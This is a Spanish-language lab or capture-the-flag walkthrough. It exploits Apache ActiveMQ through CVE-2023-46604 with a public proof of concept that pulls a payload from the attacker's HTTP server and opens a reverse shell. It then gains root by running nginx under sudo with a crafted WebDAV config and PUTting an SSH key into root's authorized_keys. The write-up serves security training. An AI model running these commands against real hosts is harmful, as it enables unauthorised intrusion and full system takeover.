 #RCE,_CVE-2023-46604,_Privilege_Escalation,_SSH_Key_Theft 
 
- analizamos con [[nmap]] los puertos y vemos que tenemos un 80 abierto, y si vemos el servicio vemos que es un activemq, asique mirando las claves de inicio por defeco podemos ver que se accede asi
![[Pasted image 20240114190003 1.png]]
![[Pasted image 20240114190124 1.png]]


- una vez dentro podemos ver la version del activemq y si hacemos una busqueda podemos ver que es vulnerable a CVE-2023-46604 https://github.com/rootsecdev/CVE-2023-46604

![[Pasted image 20240114190218 1.png]]
- si hacemos uso de la herramienta debemos:
	- cambiar el archivo "poc-linux.xml", la linea 11 con nuestra ip y un puerto (donde luego pondemos [[nc]] en modo escucha)
	- y utilizar un servidor para exponer el archivo de linux `python3 -m http.server 8001` 
	- nos ponemos en modo escucha `nc -lpvn 8001`
```bash
go run main.go -i <Target> -p 61616 -u http://<lhost>:8001/poc-linux.xml
```

- en este punto ya debemos tener la revershell, ahora debemos comprobar si el usuario tiene permisos de sudo para ejecutar alguno comando, en este caso podemos ejecutar el binario de nginx y esto lo podemos usar, ya que podemos cabiar el archivo de configuracion de nginx con uno personalizado, y de esta manera hablilitar un servidor WevDav con permisos de root que permita el metodo PUT
```XML
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events { 
	worker_connections 768; 
} 
http { 
	server {
		listen 1337; 
		root /; 
		autoindex on; 
		dav_methods PUT; 
	} 
}
```
ahora ejecutamos nginx con ese archivo de configuracion

```bash
sudo /usr/sbin/nginx -c ~/nginx_2.conf
```
y podemos comprobar si tenemos el servidor establecido mirando si el puerto esta abierto

```bash
ss -tlpn
```
![[Pasted image 20240114191203 1.png]]

- gracias a que tenemos el habilitado el metodo PUT y se esta ejecutando con permiso de admin vamos a generar un sshkey
```bash
ssh-keygen
```
![[Pasted image 20240114191308 1.png]]
- subimos el archivo con [[curl]]
```bash
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
```

- entramos por ssh al usuario root
```bash
ssh -i root root@<ip>
```
![[Pasted image 20240114191441 1.png]]
- fin